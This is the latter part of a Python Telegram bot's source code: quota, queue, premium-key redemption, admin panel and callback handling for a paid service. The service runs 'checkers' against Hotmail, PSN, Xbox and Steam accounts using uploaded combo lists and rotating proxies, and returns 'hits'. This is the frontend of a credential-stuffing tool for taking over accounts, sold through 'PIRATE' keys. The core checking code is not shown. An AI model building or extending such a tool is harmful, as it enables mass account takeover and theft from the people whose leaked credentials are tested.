    if uid == OWNER_ID or has_access(uid):
        await update.message.reply_text("♾ <b>Unlimited</b> access (premium / owner).",
            parse_mode=ParseMode.HTML); return
    e = _quota_state(uid)
    lines = [f"🎟 <b>Free tier — daily quota</b>\n",
             f"📅 Date: <code>{e['date']}</code> (UTC)\n",
             f"🔄 Resets at midnight UTC\n"]
    for mode, limit in FREE_LIMITS.items():
        used = e["used"].get(mode, 0)
        rem  = max(0, limit - used)
        mark = "🟢" if rem > 0 else "🔴"
        lines.append(f"{mark} <b>{mode}</b>: <code>{used}/{limit}</code> used · <code>{rem}</code> left")
    lines.append(f"\n🔑 Redeem a key for <b>unlimited</b> access.")
    await update.message.reply_text("\n".join(lines),
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("🔑 Redeem Key", callback_data="redeem")]]))

async def cmd_queue(update, ctx):
    if not await _require_join(update, ctx): return
    register_user(update)
    uid = update.effective_user.id
    pos = queue_position(update.effective_chat.id)
    is_premium = has_access(uid)
    if is_premium:
        with QUEUE_LOCK: premium_running = ACTIVE_PREMIUM
        await update.message.reply_text(
            f"📊 <b>Queue Status</b>\n\n"
            f"⚡ <b>You have priority</b> — no queue.\n"
            f"👑 Premium slots in use: <code>{premium_running}/{MAX_PREMIUM_PARALLEL}</code>",
            parse_mode=ParseMode.HTML)
        return
    with QUEUE_LOCK:
        total = len(FREE_QUEUE)
        free_running = ACTIVE_FREE
        prem_running_count = ACTIVE_PREMIUM
    lines = [f"📊 <b>Queue Status</b>\n",
             f"🎟 Free line waiting: <code>{total}</code>",
             f"🔴 Free job running: <code>{'yes' if free_running else 'no'}</code>"]
    if prem_running_count > 0:
        lines.append(f"⏳ <i>Waiting on premium jobs: {prem_running_count}</i>")
    if pos > 0: lines.append(f"\n📍 <b>Your position:</b> <code>#{pos}</code>")
    else: lines.append(f"\nYou are not in the queue.")
    lines.append(f"\n👑 Premium users skip the line.")
    lines.append(f"🔑 Redeem a key for instant access.")
    await update.message.reply_text("\n".join(lines),
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("🔑 Redeem Key", callback_data="redeem")]]))

async def cmd_redeem(update, ctx):
    if not await _require_join(update, ctx): return
    register_user(update)
    ctx.user_data["awaiting_key"] = True
    await update.message.reply_text(
        "🔑 <b>Send your key</b>\nFormat: <code>PIRATE-XXXX-XXXX-XXXX</code>",
        parse_mode=ParseMode.HTML)

async def _handle_key_input(update, ctx):
    ctx.user_data["awaiting_key"] = False
    key = update.message.text.strip().upper()
    uid = update.effective_user.id
    ok, msg = redeem_key(uid, key)
    if ok:
        await update.message.reply_text(
            f"✅ <b>Key redeemed!</b>\n"
            f"⏱ Access extended — expires in <code>{msg}</code>\n"
            f"♾ <b>Unlimited</b> checks + queue skip unlocked.",
            parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text(msg, parse_mode=ParseMode.HTML)

# ── admin handlers ──────────────────────────────────────────────────────────
def _is_admin(uid): return uid == OWNER_ID

async def _handle_genkey_single(update, ctx):
    ctx.user_data["admin_genkey"] = False
    raw = update.message.text.strip()
    seconds = parse_duration(raw)
    if seconds <= 0:
        await update.message.reply_text("❌ Could not parse. Try <code>1h</code>, <code>1d</code>, <code>7d</code>.",
            parse_mode=ParseMode.HTML); return
    uses = ctx.user_data.pop("pending_uses", 1)
    key = gen_key(seconds=seconds, uses=uses)
    dur = f"{seconds//86400}d {((seconds%86400)//3600)}h" if seconds >= 86400 else f"{seconds//3600}h"
    await update.message.reply_text(
        f"✅ <b>Key generated</b>\n🔑 <code>{key}</code>\n"
        f"⏱ Duration: <code>{dur}</code>\n👥 Uses: <code>{uses}</code>",
        parse_mode=ParseMode.HTML, reply_markup=back_kb("admin"))

async def _handle_broadcast(update, ctx):
    ctx.user_data["admin_broadcast"] = False
    text = update.message.text
    targets = broadcast_targets()
    progress = await update.message.reply_text(
        f"📢 <b>Broadcasting…</b>\n🎯 Targets: <code>{len(targets)}</code>\n"
        f"✅ Sent: <code>0</code>\n❌ Failed: <code>0</code>",
        parse_mode=ParseMode.HTML)
    sent = 0; failed = 0
    for i, uid in enumerate(targets, 1):
        try:
            await ctx.bot.send_message(uid, text); sent += 1
        except Exception:
            failed += 1
        if i % 25 == 0 or i == len(targets):
            try:
                await progress.edit_text(
                    f"📢 <b>Broadcasting…</b>\n🎯 Progress: <code>{i}/{len(targets)}</code>\n"
                    f"✅ Sent: <code>{sent}</code>\n❌ Failed: <code>{failed}</code>",
                    parse_mode=ParseMode.HTML)
            except Exception: pass
        await asyncio.sleep(0.05)
    await progress.edit_text(
        f"📢 <b>Broadcast complete</b>\n🎯 Targets: <code>{len(targets)}</code>\n"
        f"✅ Sent: <code>{sent}</code>\n❌ Failed: <code>{failed}</code>",
        parse_mode=ParseMode.HTML, reply_markup=back_kb("admin"))

async def _handle_remove(update, ctx):
    ctx.user_data["admin_remove"] = False
    try: uid = int(update.message.text.strip())
    except Exception:
        await update.message.reply_text("❌ Invalid user ID."); return
    users = load_users(); extra = load_extra(); removed = False
    if str(uid) in users:
        del users[str(uid)]; save_users(users); removed = True
    if uid in extra:
        extra = [x for x in extra if int(x) != uid]; save_extra(extra); removed = True
    if removed:
        await update.message.reply_text(f"🚫 <b>Removed</b> user <code>{uid}</code>",
            parse_mode=ParseMode.HTML, reply_markup=back_kb("admin"))
    else:
        await update.message.reply_text("❌ User not in registry.")

async def _handle_import(update, ctx):
    ctx.user_data["admin_import"] = False
    raw = update.message.text
    ids = []
    for tok in re.split(r"[,\s;]+", raw):
        tok = tok.strip()
        if not tok or not re.fullmatch(r"-?\d+", tok): continue
        try:
            v = int(tok)
            if v == OWNER_ID: continue
            ids.append(v)
        except Exception: pass
    if not ids:
        await update.message.reply_text("❌ No valid IDs found.", parse_mode=ParseMode.HTML); return
    extra = set(int(x) for x in load_extra()); before = len(extra)
    extra.update(ids); save_extra(list(extra)); added = len(extra) - before
    await update.message.reply_text(
        f"📥 <b>Imported</b>\n✅ Added: <code>{added}</code>\n"
        f"🔄 Duplicates skipped: <code>{len(ids)-added}</code>\n"
        f"📦 Total pool now: <code>{len(extra)}</code>",
        parse_mode=ParseMode.HTML, reply_markup=back_kb("admin"))

async def _handle_resetquota(update, ctx):
    ctx.user_data["admin_resetquota"] = False
    raw = update.message.text.strip()
    frees = _load_frees()
    if raw.lower() == "all":
        _save_frees({})
        await update.message.reply_text("✅ <b>All free-tier counters reset.</b>",
            parse_mode=ParseMode.HTML, reply_markup=back_kb("admin"))
        return
    try: uid = int(raw)
    except Exception:
        await update.message.reply_text("❌ Send user ID or <code>all</code>.",
            parse_mode=ParseMode.HTML, reply_markup=back_kb("admin")); return
    if str(uid) in frees:
        del frees[str(uid)]; _save_frees(frees)
        await update.message.reply_text(f"✅ <b>Quota reset for</b> <code>{uid}</code>",
            parse_mode=ParseMode.HTML, reply_markup=back_kb("admin"))
    else:
        await update.message.reply_text(f"❌ No quota entry for <code>{uid}</code>.",
            parse_mode=ParseMode.HTML, reply_markup=back_kb("admin"))

# ── callback router ─────────────────────────────────────────────────────────
async def on_button(update, ctx):
    q = update.callback_query
    await q.answer()
    data = q.data
    uid  = update.effective_user.id
    chat_id = update.effective_chat.id
    job  = SESSIONS.get(chat_id)
    register_user(update)

    if data == "verify_join":
        in_channel, in_chat = await _check_join(ctx.bot, uid)
        if in_channel and in_chat:
            await q.message.reply_text(
                "✅ <b>Verified!</b>\nAccess unlocked. Tap <b>🔎 Checkers</b> to begin.",
                parse_mode=ParseMode.HTML,
                reply_markup=main_menu_kb(uid))
        else:
            await _send_join_gate(update, ctx, in_channel, in_chat)
        return

    if not await _require_join(update, ctx): return

    if data == "checkers":
        await q.message.reply_text("🔎 <b>Checkers</b>\nPick a mode:",
            parse_mode=ParseMode.HTML, reply_markup=checkers_menu_kb())
    elif data == "hotmail_default":
        await _prompt_combos(update, ctx, "hotmail")
    elif data == "hotmail_custom":
        await q.message.reply_text(
            "📝 <b>Custom keywords</b>\n"
            "Send keywords one per line, or upload <code>keywords.txt</code>.",
            parse_mode=ParseMode.HTML, reply_markup=hotmail_custom_kb())
    elif data == "hotmail_typed":
        ctx.user_data["awaiting_keywords"] = True
        await q.message.reply_text("⌨️ <b>Send keywords</b>\nOne per line.",
            parse_mode=ParseMode.HTML)
    elif data == "hotmail_upload":
        ctx.user_data["awaiting_keywords_file"] = True
        await q.message.reply_text("📎 <b>Send your keywords.txt</b>\nOne keyword per line.",
            parse_mode=ParseMode.HTML)

    # proxy menu
    elif data == "proxy_menu":
        ps = user_proxies(uid); ptype = user_proxy_type(uid)
        lines = [f"🌐 <b>Proxy Settings</b>\n",
                 f"👤 Your proxies: <code>{len(ps)}</code>",
                 f"🔧 Type: <code>{ptype}</code>"]
        if ps:
            lines.append("\n<b>Sample (first 5):</b>")
            for i, p in enumerate(ps[:5], 1):
                lines.append(f"{i}. <code>{html.escape(p)}</code>")
            if len(ps) > 5: lines.append(f"… +{len(ps)-5} more")
        else:
            lines.append("\n<i>No proxies loaded.</i>")
        await q.message.reply_text("\n".join(lines),
            parse_mode=ParseMode.HTML, reply_markup=proxy_menu_kb(uid))
    elif data == "proxy_upload":
        ctx.user_data["awaiting_proxy_file"] = True
        await q.message.reply_text(
            "📎 <b>Send your proxies.txt</b>\n"
            "One proxy per line, <code>ip:port</code> or <code>user:pass@ip:port</code>.",
            parse_mode=ParseMode.HTML)
    elif data == "proxy_paste":
        ctx.user_data["awaiting_proxy_text"] = True
        await q.message.reply_text(
            "⌨️ <b>Paste proxies</b>\nOne per line. Type <code>cancel</code> to abort.",
            parse_mode=ParseMode.HTML)
    elif data == "proxy_type_http":
        set_user_proxies(uid, user_proxies(uid), "http")
        await q.message.reply_text("✅ Proxy type set to <b>HTTP</b>", parse_mode=ParseMode.HTML)
    elif data == "proxy_type_socks4":
        set_user_proxies(uid, user_proxies(uid), "socks4")
        await q.message.reply_text("✅ Proxy type set to <b>SOCKS4</b>", parse_mode=ParseMode.HTML)
    elif data == "proxy_type_socks5":
        set_user_proxies(uid, user_proxies(uid), "socks5")
        await q.message.reply_text("✅ Proxy type set to <b>SOCKS5</b>", parse_mode=ParseMode.HTML)
    elif data == "proxy_show":
        ps = user_proxies(uid); ptype = user_proxy_type(uid)
        if not ps:
            await q.message.reply_text("🚫 No proxies loaded.")
        else:
            shown = "\n".join(f"<code>{html.escape(p)}</code>" for p in ps[:30])
            extra = f"\n… +{len(ps)-30} more" if len(ps) > 30 else ""
            await q.message.reply_text(
                f"🌐 <b>Your proxies</b> ({len(ps)}) — type <code>{ptype}</code>\n\n{shown}{extra}",
                parse_mode=ParseMode.HTML)
    elif data == "proxy_clear":
        clear_user_proxies(uid)
        await q.message.reply_text("🗑 <b>Proxies cleared.</b>", parse_mode=ParseMode.HTML)
    elif data == "toggle_proxy_on":
        ps = user_proxies(uid)
        if not ps:
            await q.message.reply_text(
                "🚫 <b>No proxies loaded.</b> Open 🌐 Proxy Settings first.",
                parse_mode=ParseMode.HTML)
        else:
            ctx.user_data["use_proxy"] = True
            mode = ctx.user_data.get("pending_mode", "hotmail")
            kw   = ctx.user_data.get("pending_keywords")
            await q.message.reply_text(
                f"🌐 <b>Proxy mode ON</b> — will use one of your <code>{len(ps)}</code> proxies.",
                parse_mode=ParseMode.HTML)
            await _combos_prompt_only(update, ctx, mode, kw)
    elif data == "toggle_proxy_off":
        ctx.user_data["use_proxy"] = False
        mode = ctx.user_data.get("pending_mode", "hotmail")
        kw   = ctx.user_data.get("pending_keywords")
        await q.message.reply_text(
            "🚫 <b>Proxy mode OFF</b> — direct connection.",
            parse_mode=ParseMode.HTML)
        await _combos_prompt_only(update, ctx, mode, kw)

    elif data in {"new_job", "new_job_hotmail", "new_job_psn", "new_job_xbox", "new_job_steam"}:
        mode_map = {"new_job_hotmail":"hotmail", "new_job_psn":"psn",
                    "new_job_xbox":"xbox", "new_job_steam":"steam"}
        mode = mode_map.get(data)
        if mode is None:
            await q.message.reply_text("Pick a mode:", reply_markup=checkers_menu_kb()); return
        if not await _require_access(update, ctx, mode): return
        if chat_id in SESSIONS and SESSIONS[chat_id].running:
            await q.message.reply_text("⚠️ A job is already running. /stop first."); return
        if mode == "hotmail":
            await q.message.reply_text("📧 <b>Hotmail mode</b>\nPick a keyword source:",
                parse_mode=ParseMode.HTML, reply_markup=hotmail_mode_kb())
            return
        await _prompt_combos(update, ctx, mode)

    elif data == "my_status":
        s = user_status(uid)
        if s["role"] == "OWNER":
            await q.message.reply_text("👑 <b>Owner</b> — full access.", parse_mode=ParseMode.HTML)
        elif not s["until"] or s["until"] <= time.time():
            await q.message.reply_text(
                "🟡 <b>Free tier</b>\nDaily limits + queue apply. See 🎟 My Quota.",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("🎟 My Quota", callback_data="my_quota")],
                    [InlineKeyboardButton("🔑 Redeem Key", callback_data="redeem")]]))
        else:
            await q.message.reply_text(
                f"🟢 <b>Premium active</b>\n⏱ Expires in: <code>{fmt_until(s['until'])}</code>\n"
                f"🔑 Keys used: <code>{len(s['keys'])}</code>\n♾ Unlimited + queue skip",
                parse_mode=ParseMode.HTML)

    elif data == "my_quota":
        if uid == OWNER_ID or has_access(uid):
            await q.message.reply_text("♾ <b>Unlimited</b> access (premium / owner).",
                parse_mode=ParseMode.HTML)
        else:
            e = _quota_state(uid)
            lines = [f"🎟 <b>Free tier — daily quota</b>\n",
                     f"📅 <code>{e['date']}</code> (UTC)\n"]
            for mode, limit in FREE_LIMITS.items():
                used = e["used"].get(mode, 0)
                rem  = max(0, limit - used)
                mark = "🟢" if rem > 0 else "🔴"
                lines.append(f"{mark} <b>{mode}</b>: <code>{used}/{limit}</code> · <code>{rem}</code> left")
            lines.append(f"\n🔑 Redeem a key for <b>unlimited</b> access.")
            await q.message.reply_text("\n".join(lines),
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("🔑 Redeem Key", callback_data="redeem")]]))

    elif data == "queue_view":
        pos = queue_position(chat_id)
        is_premium = has_access(uid)
        if is_premium:
            with QUEUE_LOCK: premium_running = ACTIVE_PREMIUM
            await q.message.reply_text(
                f"📊 <b>Queue Status</b>\n\n"
                f"⚡ <b>You have priority</b> — no queue.\n"
                f"👑 Premium slots in use: <code>{premium_running}/{MAX_PREMIUM_PARALLEL}</code>",
                parse_mode=ParseMode.HTML)
        else:
            with QUEUE_LOCK:
                total = len(FREE_QUEUE)
                free_running = ACTIVE_FREE
                prem_running_count = ACTIVE_PREMIUM
            lines = [f"📊 <b>Queue Status</b>\n",
                     f"🎟 Free line waiting: <code>{total}</code>",
                     f"🔴 Free job running: <code>{'yes' if free_running else 'no'}</code>"]
            if prem_running_count > 0:
                lines.append(f"⏳ <i>Waiting on premium jobs: {prem_running_count}</i>")
            if pos > 0: lines.append(f"\n📍 <b>Your position:</b> <code>#{pos}</code>")
            else: lines.append(f"\nYou are not in the queue.")
            lines.append(f"\n👑 Premium users skip the line.")
            lines.append(f"🔑 Redeem a key for instant access.")
            await q.message.reply_text("\n".join(lines),
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("🔑 Redeem Key", callback_data="redeem")]]))

    elif data == "redeem":
        ctx.user_data["awaiting_key"] = True
        await q.message.reply_text("🔑 Send your key now.", parse_mode=ParseMode.HTML)
    elif data == "stop":
        if job and job.running:
            job.running = False
            try: await q.message.reply_text("🛑 Stopped — sending hits now…")
            except Exception: pass
            await job._auto_export()
        else:
            await q.message.reply_text("Nothing to stop.")
    elif data == "help":
        await cmd_help(update, ctx)
    elif data == "back_main":
        await q.message.reply_text(
            _welcome_text(uid, q.from_user.first_name if q.from_user else "there"),
            parse_mode=ParseMode.HTML, reply_markup=main_menu_kb(uid),
            disable_web_page_preview=True)

    elif data.startswith("admin") or data == "admin":
        if not _is_admin(uid):
            await q.message.reply_text("⛔ Not allowed."); return
        if data == "admin":
            await q.message.reply_text("👑 <b>ADMIN PANEL</b>\n━━━━━━━━━━━━━━━━━━━━━━",
                parse_mode=ParseMode.HTML, reply_markup=admin_menu_kb())
        elif data == "admin_genkey":
            ctx.user_data["admin_genkey"] = True
            await q.message.reply_text(
                "🔑 <b>Send duration</b>\n"
                "Examples: <code>1h</code>, <code>1d</code>, <code>7d</code>, <code>1d 12h</code>",
                parse_mode=ParseMode.HTML, reply_markup=back_kb("admin"))
        elif data == "admin_listkeys":
            keys = load_keys()
            if not keys:
                await q.message.reply_text("📭 No keys yet."); return
            lines = []
            for k, v in list(keys.items())[-30:]:
                dur = v["duration"]
                d = f"{dur//86400}d{(dur%86400)//3600}h" if dur >= 86400 else f"{dur//3600}h"
                lines.append(f"<code>{k}</code>\n  ⏱ {d} · 👥 {v['uses_left']} left · "
                             f"🕒 {datetime.fromtimestamp(v['created']).strftime('%m-%d %H:%M')}")
            await q.message.reply_text(
                f"📋 <b>Keys ({len(keys)})</b> — last 30\n\n" + "\n".join(lines),
                parse_mode=ParseMode.HTML, reply_markup=back_kb("admin"))
        elif data == "admin_broadcast":
            pool = broadcast_targets()
            ctx.user_data["admin_broadcast"] = True
            await q.message.reply_text(
                f"📢 <b>Broadcast</b>\n🎯 Current pool: <code>{len(pool)}</code>\n\nSend the message now.",
                parse_mode=ParseMode.HTML, reply_markup=back_kb("admin"))
        elif data == "admin_users":
            users = load_users(); extra = load_extra()
            if not users and not extra:
                await q.message.reply_text("📭 No users."); return
            now = time.time(); lines = []
            for uid_s, info in list(users.items())[-40:]:
                active = "🟢" if info.get("until", 0) > now else "🟡"
                uname = info.get("username") or info.get("name") or ""
                lines.append(f"{active} <code>{uid_s}</code> {html.escape(uname)} — {fmt_until(info.get('until'))}")
            extra_note = f"\n\n📥 Extra imported: <code>{len(extra)}</code>" if extra else ""
            await q.message.reply_text(
                f"👥 <b>Registry ({len(users)})</b> — last 40\n\n" + "\n".join(lines) + extra_note,
                parse_mode=ParseMode.HTML, reply_markup=back_kb("admin"))
        elif data == "admin_import":
            ctx.user_data["admin_import"] = True
            await q.message.reply_text("📥 <b>Send raw Telegram IDs</b>\nSeparated by comma/space/newline.",
                parse_mode=ParseMode.HTML, reply_markup=back_kb("admin"))
        elif data == "admin_remove":
            ctx.user_data["admin_remove"] = True
            await q.message.reply_text("🚫 <b>Send the user ID to remove.</b>",
                parse_mode=ParseMode.HTML, reply_markup=back_kb("admin"))
        elif data == "admin_resetquota":
            ctx.user_data["admin_resetquota"] = True
            await q.message.reply_text(
                "🎟 <b>Reset quota</b>\nSend a user ID, or send <code>all</code> to wipe every counter.",
                parse_mode=ParseMode.HTML, reply_markup=back_kb("admin"))
        elif data == "admin_stats":
            users = load_users(); keys = load_keys(); extra = load_extra(); frees = _load_frees()
            now = time.time()
            active = sum(1 for u in users.values() if u.get("until", 0) > now)
            live_keys = sum(1 for k in keys.values() if k.get("uses_left", 0) > 0)
            with QUEUE_LOCK:
                free_waiting = len(FREE_QUEUE)
                prem_running = ACTIVE_PREMIUM
            await q.message.reply_text(
                f"📊 <b>Global Stats</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
                f"👥 Users registered: <code>{len(users)}</code>\n"
                f"🟢 Premium active: <code>{active}</code>\n"
                f"🟡 Free tier: <code>{len(users)-active}</code>\n"
                f"📥 Extra imported: <code>{len(extra)}</code>\n"
                f"🎟 Free-tier tracked: <code>{len(frees)}</code>\n\n"
                f"🔑 Keys generated: <code>{len(keys)}</code>\n"
                f"🟢 Keys with uses left: <code>{live_keys}</code>\n\n"
                f"📊 Queue waiting: <code>{free_waiting}</code>\n"
                f"👑 Premium running: <code>{prem_running}/{MAX_PREMIUM_PARALLEL}</code>\n\n"
                f"📢 Broadcast pool: <code>{len(broadcast_targets())}</code>",
                parse_mode=ParseMode.HTML, reply_markup=back_kb("admin"))

async def _post_init(app):
    set_bot_ref(app.bot)
    try:
        if LOGO_FILE.exists():
            with open(LOGO_FILE, "rb") as f:
                await app.bot.set_chat_photo(
                    chat_id=app.bot.id,
                    photo=InputFile(f, filename="logo.png"))
            print("[+] bot profile photo updated from logo.png")
        else:
            print("[!] logo.png not found next to bot.py — skipping profile photo")
    except Exception as e:
        print(f"[!] profile photo update failed: {e}")

    await app.bot.set_my_commands([
        BotCommand("start",    "main menu"),
        BotCommand("newjob",   "pick checkers"),
        BotCommand("hotmail",  "hotmail checker"),
        BotCommand("psn",      "psn mode"),
        BotCommand("xbox",     "xbox mode"),
        BotCommand("steam",    "steam mode"),
        BotCommand("status",   "live job status"),
        BotCommand("stop",     "stop job + send hits"),
        BotCommand("mykey",    "show my key status"),
        BotCommand("quota",    "my daily free-tier quota"),
        BotCommand("queue",    "view queue status"),
        BotCommand("proxy",    "manage my proxies"),
        BotCommand("redeem",   "redeem a key"),
        BotCommand("help",     "help"),
    ])

def main():
    try:
        asyncio.get_event_loop()
    except RuntimeError:
        asyncio.set_event_loop(asyncio.new_event_loop())

    threading.Thread(target=run_fake_server, daemon=True).start()

    app = (Application.builder()
           .token(BOT_TOKEN)
           .post_init(_post_init)
           .build())
    app.add_handler(CommandHandler("start",    cmd_start))
    app.add_handler(CommandHandler("hotmail",  cmd_hotmail))
    app.add_handler(CommandHandler("psn",      cmd_psn))
    app.add_handler(CommandHandler("xbox",     cmd_xbox))
    app.add_handler(CommandHandler("steam",    cmd_steam))
    app.add_handler(CommandHandler("newjob",   cmd_newjob))
    app.add_handler(CommandHandler("status",   cmd_status))
    app.add_handler(CommandHandler("stop",     cmd_stop))
    app.add_handler(CommandHandler("help",     cmd_help))
    app.add_handler(CommandHandler("mykey",    cmd_mykey))
    app.add_handler(CommandHandler("quota",    cmd_quota))
    app.add_handler(CommandHandler("queue",    cmd_queue))
    app.add_handler(CommandHandler("proxy",    cmd_proxy))
    app.add_handler(CommandHandler("redeem",   cmd_redeem))
    app.add_handler(CallbackQueryHandler(on_button))
    app.add_handler(MessageHandler(filters.Document.TXT, handle_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    print("[+] bot running — ctrl-c to stop")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
